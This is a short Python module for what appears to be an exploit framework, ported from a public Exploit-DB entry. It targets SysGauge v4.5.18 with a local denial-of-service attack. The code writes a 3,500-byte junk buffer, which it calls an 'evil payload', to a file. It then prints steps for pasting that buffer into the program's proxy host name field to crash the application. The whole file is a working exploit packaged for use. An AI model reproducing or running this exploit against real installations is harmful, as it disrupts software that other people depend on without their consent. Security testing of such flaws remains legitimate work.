from module import Module


class BoomerModule(Module):
    def __init__(self):
        info = {"Name": "SysGauge - DoS",
                "Module Author": "Josue Encinar",
                "Exploit Author": "Hashim Jawad ",
                "Description": "SysGauge v4.5.18 - Local Denial of Service",
                "Reference": "https://www.exploit-db.com/exploits/44372/",
                }
        options = {
            "file": ["File to dump payload", "files/output/sysgauge.txt", True]
        }
        super(BoomerModule, self).__init__(options, info)

    def run(self):
        buffer = "J" * 3500
        try:
            with open(self.options["file"][1], "w") as my_file:
                print(f"[+] Creating {len(buffer)} bytes evil payload..")
                my_file.write(buffer)
            self.print_ok(f'{self.options["file"][1]} file created!')
            self.print_info("""1. Copy content of %s
    2. Select Manual proxy configuration under Options->Proxy
    3. Paste content in 'Proxy Server Host Name' field and click Save""" % self.options["file"][1])
        except Exception as e:
            self.print_error(e)
